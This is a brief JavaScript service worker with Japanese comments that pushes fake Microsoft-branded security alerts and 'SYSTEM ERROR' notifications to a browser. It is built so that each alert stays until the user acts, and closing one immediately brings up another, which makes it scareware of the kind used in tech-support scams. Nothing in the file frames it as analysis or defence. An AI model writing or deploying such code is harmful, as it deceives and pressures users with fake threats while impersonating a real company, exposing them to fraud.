// 次の1つを出す関数
function spawn(registration) {
    const isIcon = Math.random() > 0.5;
    registration.showNotification(isIcon ? "⚠ Microsoft警告" : "SYSTEM ERROR", {
        body: isIcon ? "脅威を検出しました。システムを保護してください。" : "致命的なエラー: 0x800410",
        icon: "https://img.icons8.com/color/96/microsoft.png",
        tag: 'zombie-task', // 常に1つだけ表示させるためのタグ
        requireInteraction: true // ユーザーがアクションを起こすまで消えない
    });
}

// 最初の起動メッセージを受け取ったとき
self.addEventListener('message', (event) => {
    if (event.data === 'start') {
        spawn(self.registration);
    }
});

// 通知が閉じられた（×ボタンなど）時のみ発動！
self.addEventListener('notificationclose', (event) => {
    // 閉じられた瞬間に次の1つを補充する
    spawn(self.registration);
});

// 通知がクリックされた時は、何も補充せず閉じるだけ
self.addEventListener('notificationclick', (event) => {
    event.notification.close();
});
